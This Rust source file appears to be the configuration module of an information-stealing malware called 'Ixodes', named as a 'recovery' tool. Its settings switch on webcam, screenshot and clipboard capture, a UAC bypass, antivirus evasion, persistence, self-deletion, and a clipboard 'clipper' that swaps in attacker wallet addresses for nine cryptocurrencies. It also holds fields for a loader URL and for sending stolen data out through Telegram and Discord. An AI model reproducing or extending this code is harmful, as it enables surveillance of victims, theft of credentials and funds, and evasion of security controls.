use crate::recovery::defaults::*;
use crate::recovery::task::RecoveryCategory;
use base64::{Engine as _, engine::general_purpose::STANDARD};
use once_cell::sync::Lazy;
use std::{collections::HashSet, env, str::FromStr};
use tracing::{info, warn};

static GLOBAL_RECOVERY_CONTROL: Lazy<RecoveryControl> = Lazy::new(RecoveryControl::from_env);

#[derive(Debug)]
pub struct RecoveryControl {
    allowed_categories: Option<HashSet<RecoveryCategory>>,
    artifact_key: Option<Vec<u8>>,
    capture_screenshots: bool,
    capture_webcams: bool,
    capture_clipboard: bool,
    uac_bypass_enabled: bool,
    evasion_enabled: bool,
    clipper_enabled: bool,
    melt_enabled: bool,
    btc_address: Option<String>,
    eth_address: Option<String>,
    ltc_address: Option<String>,
    xmr_address: Option<String>,
    doge_address: Option<String>,
    dash_address: Option<String>,
    sol_address: Option<String>,
    trx_address: Option<String>,
    ada_address: Option<String>,
    telegram_token: Option<String>,
    telegram_chat_id: Option<String>,
    discord_webhook: Option<String>,
    loader_url: Option<String>,
    proxy_server: Option<String>,
    persistence_enabled: bool,
    #[allow(dead_code)]
    pump_size_mb: u32,
    blocked_countries: Option<HashSet<String>>,
    custom_extensions: Option<HashSet<String>>,
    custom_keywords: Option<HashSet<String>>,
}

impl RecoveryControl {
    pub fn global() -> &'static Self {
        &GLOBAL_RECOVERY_CONTROL
    }

    pub fn allows_category(&self, category: RecoveryCategory) -> bool {
        self.allowed_categories
            .as_ref()
            .map(|set| set.contains(&category))
            .unwrap_or(true)
    }

    pub fn blocked_countries(&self) -> HashSet<String> {
        self.blocked_countries.clone().unwrap_or_default()
    }

    pub fn custom_extensions(&self) -> HashSet<String> {
        self.custom_extensions.clone().unwrap_or_default()
    }

    pub fn custom_keywords(&self) -> HashSet<String> {
        self.custom_keywords.clone().unwrap_or_default()
    }

    #[allow(dead_code)]
    pub fn pump_size_mb(&self) -> u32 {
        self.pump_size_mb
    }

    pub fn artifact_key(&self) -> Option<&[u8]> {
        self.artifact_key.as_deref()
    }
    pub fn capture_screenshots(&self) -> bool {
        self.capture_screenshots
    }

    pub fn capture_webcams(&self) -> bool {
        self.capture_webcams
    }

    pub fn capture_clipboard(&self) -> bool {
        self.capture_clipboard
    }

    pub fn persistence_enabled(&self) -> bool {
        self.persistence_enabled
    }

    pub fn uac_bypass_enabled(&self) -> bool {
        self.uac_bypass_enabled
    }

    pub fn evasion_enabled(&self) -> bool {
        self.evasion_enabled
    }

    pub fn clipper_enabled(&self) -> bool {
        self.clipper_enabled
    }

    pub fn melt_enabled(&self) -> bool {
        self.melt_enabled
    }

    pub fn btc_address(&self) -> Option<&str> {
        self.btc_address.as_deref()
    }

    pub fn eth_address(&self) -> Option<&str> {
        self.eth_address.as_deref()
    }

    pub fn ltc_address(&self) -> Option<&str> {
        self.ltc_address.as_deref()
    }

    pub fn xmr_address(&self) -> Option<&str> {
        self.xmr_address.as_deref()
    }

    pub fn doge_address(&self) -> Option<&str> {
        self.doge_address.as_deref()
    }

    pub fn dash_address(&self) -> Option<&str> {
        self.dash_address.as_deref()
    }

    pub fn sol_address(&self) -> Option<&str> {
        self.sol_address.as_deref()
    }

    pub fn trx_address(&self) -> Option<&str> {
        self.trx_address.as_deref()
    }

    pub fn ada_address(&self) -> Option<&str> {
        self.ada_address.as_deref()
    }

    pub fn telegram_token(&self) -> Option<&str> {
        self.telegram_token.as_deref()
    }

    pub fn telegram_chat_id(&self) -> Option<&str> {
        self.telegram_chat_id.as_deref()
    }

    pub fn discord_webhook(&self) -> Option<&str> {
        self.discord_webhook.as_deref()
    }

    pub fn loader_url(&self) -> Option<&str> {
        self.loader_url.as_deref()
    }

    pub fn proxy_server(&self) -> Option<&str> {
        self.proxy_server.as_deref()
    }

    fn from_env() -> Self {
        let allowed_categories = env::var("IXODES_ENABLED_CATEGORIES")
            .ok()
            .and_then(|value| parse_categories(&value))
            .or_else(|| default_categories());

        if let Some(categories) = allowed_categories.as_ref() {
            info!(
                "restricting recovery to {} categories",
                categories
                    .iter()
                    .map(|category| category.to_string())
                    .collect::<Vec<_>>()
                    .join(", ")
            );
        }

        let artifact_key = env::var("IXODES_ARTIFACT_KEY")
            .ok()
            .and_then(|value| decode_artifact_key(&value))
            .or_else(|| DEFAULT_ARTIFACT_KEY.and_then(decode_artifact_key));

        if artifact_key.is_some() {
            info!("artifact encryption enabled");
        }

        let capture_screenshots =
            parse_flag("IXODES_CAPTURE_SCREENSHOTS").unwrap_or(DEFAULT_CAPTURE_SCREENSHOTS);
        let capture_webcams =
            parse_flag("IXODES_CAPTURE_WEBCAM").unwrap_or(DEFAULT_CAPTURE_WEBCAMS);
        let capture_clipboard =
            parse_flag("IXODES_CAPTURE_CLIPBOARD").unwrap_or(DEFAULT_CAPTURE_CLIPBOARD);
        let persistence_enabled = parse_flag("IXODES_PERSISTENCE").unwrap_or(DEFAULT_PERSISTENCE);
        let uac_bypass_enabled = parse_flag("IXODES_UAC_BYPASS").unwrap_or(DEFAULT_UAC_BYPASS);
        let evasion_enabled = parse_flag("IXODES_EVASION").unwrap_or(DEFAULT_EVASION_ENABLED);
        let clipper_enabled = parse_flag("IXODES_CLIPPER").unwrap_or(DEFAULT_CLIPPER_ENABLED);
        let melt_enabled = parse_flag("IXODES_MELT").unwrap_or(DEFAULT_MELT_ENABLED);

        let btc_address = env::var("IXODES_BTC_ADDRESS")
            .ok()
            .or_else(|| DEFAULT_BTC_ADDRESS.map(String::from));
        let eth_address = env::var("IXODES_ETH_ADDRESS")
            .ok()
            .or_else(|| DEFAULT_ETH_ADDRESS.map(String::from));
        let ltc_address = env::var("IXODES_LTC_ADDRESS")
            .ok()
            .or_else(|| DEFAULT_LTC_ADDRESS.map(String::from));
        let xmr_address = env::var("IXODES_XMR_ADDRESS")
            .ok()
            .or_else(|| DEFAULT_XMR_ADDRESS.map(String::from));
        let doge_address = env::var("IXODES_DOGE_ADDRESS")
            .ok()
            .or_else(|| DEFAULT_DOGE_ADDRESS.map(String::from));
        let dash_address = env::var("IXODES_DASH_ADDRESS")
            .ok()
            .or_else(|| DEFAULT_DASH_ADDRESS.map(String::from));
        let sol_address = env::var("IXODES_SOL_ADDRESS")
            .ok()
            .or_else(|| DEFAULT_SOL_ADDRESS.map(String::from));
        let trx_address = env::var("IXODES_TRX_ADDRESS")
            .ok()
            .or_else(|| DEFAULT_TRX_ADDRESS.map(String::from));
        let ada_address = env::var("IXODES_ADA_ADDRESS")
            .ok()
            .or_else(|| DEFAULT_ADA_ADDRESS.map(String::from));

        let pump_size_mb = parse_u32("IXODES_PUMP_SIZE_MB").unwrap_or(DEFAULT_PUMP_SIZE_MB);

        let blocked_countries = env::var("IXODES_BLOCKED_COUNTRIES")
            .ok()
            .and_then(|v| parse_string_list(&v))
            .or_else(|| default_blocked_countries());

        let custom_extensions = env::var("IXODES_CUSTOM_EXTENSIONS")
            .ok()
            .and_then(|v| parse_string_list(&v))
            .or_else(|| default_custom_extensions());

        let custom_keywords = env::var("IXODES_CUSTOM_KEYWORDS")
            .ok()
            .and_then(|v| parse_string_list(&v))
            .or_else(|| default_custom_keywords());

        let telegram_token = env::var("IXODES_TELEGRAM_TOKEN")
            .ok()
            .or_else(|| DEFAULT_TELEGRAM_TOKEN.map(String::from));
        let telegram_chat_id = env::var("IXODES_CHAT_ID")
            .ok()
            .or_else(|| DEFAULT_TELEGRAM_CHAT_ID.map(String::from));
        let discord_webhook = env::var("IXODES_DISCORD_WEBHOOK")
            .ok()
            .or_else(|| DEFAULT_DISCORD_WEBHOOK.map(String::from));

        let loader_url = env::var("IXODES_LOADER_URL")
            .ok()
            .or_else(|| DEFAULT_LOADER_URL.map(String::from));

        let proxy_server = env::var("IXODES_PROXY_SERVER")
            .ok()
            .or_else(|| DEFAULT_PROXY_SERVER.map(String::from));

        RecoveryControl {
            allowed_categories,
            artifact_key,
            capture_screenshots,
            capture_webcams,
            capture_clipboard,
            uac_bypass_enabled,
            evasion_enabled,
            clipper_enabled,
            melt_enabled,
            btc_address,
            eth_address,
            ltc_address,
            xmr_address,
            doge_address,
            dash_address,
            sol_address,
            trx_address,
            ada_address,
            telegram_token,
            telegram_chat_id,
            discord_webhook,
            loader_url,
            proxy_server,
            persistence_enabled,
            pump_size_mb,
            blocked_countries,
            custom_extensions,
            custom_keywords,
        }
    }
}

fn default_categories() -> Option<HashSet<RecoveryCategory>> {
    DEFAULT_ALLOWED_CATEGORIES.map(|categories| categories.iter().copied().collect())
}

fn parse_u32(key: &str) -> Option<u32> {
    env::var(key).ok().and_then(|v| v.parse().ok())
}

fn default_blocked_countries() -> Option<HashSet<String>> {
    DEFAULT_BLOCKED_COUNTRIES.map(|countries| countries.iter().map(|s| s.to_string()).collect())
}

fn default_custom_extensions() -> Option<HashSet<String>> {
    DEFAULT_CUSTOM_EXTENSIONS.map(|items| items.iter().map(|s| s.to_string()).collect())
}

fn default_custom_keywords() -> Option<HashSet<String>> {
    DEFAULT_CUSTOM_KEYWORDS.map(|items| items.iter().map(|s| s.to_string()).collect())
}

fn decode_artifact_key(value: &str) -> Option<Vec<u8>> {
    let trimmed = value.trim();
    if trimmed.is_empty() {
        return None;
    }
    match STANDARD.decode(trimmed) {
        Ok(bytes) => {
            if bytes.len() != 32 {
                warn!(
                    "artifact encryption key must be 32 bytes (base64); got {} bytes",
                    bytes.len()
                );
                None
            } else {
                Some(bytes)
            }
        }
        Err(err) => {
            warn!(
                error = ?err,
                "failed to decode artifact encryption key"
            );
            None
        }
    }
}

fn parse_string_list(value: &str) -> Option<HashSet<String>> {
    let mut set = HashSet::new();
    for segment in value.split(',') {
        let trimmed = segment.trim();
        if trimmed.is_empty() {
            continue;
        }
        set.insert(trimmed.to_string());
    }
    if set.is_empty() { None } else { Some(set) }
}

fn parse_categories(value: &str) -> Option<HashSet<RecoveryCategory>> {
    let mut set = HashSet::new();
    for segment in value.split(',') {
        let trimmed = segment.trim();
        if trimmed.is_empty() {
            continue;
        }
        match RecoveryCategory::from_str(trimmed) {
            Ok(category) => {
                set.insert(category);
            }
            Err(err) => {
                warn!("skipping invalid category filter {trimmed}: {err}");
            }
        }
    }
    if set.is_empty() { None } else { Some(set) }
}

fn parse_flag(key: &str) -> Option<bool> {
    env::var(key).ok().map(|value| {
        matches!(
            value.trim().to_ascii_lowercase().as_str(),
            "1" | "true" | "yes" | "on"
        )
    })
}
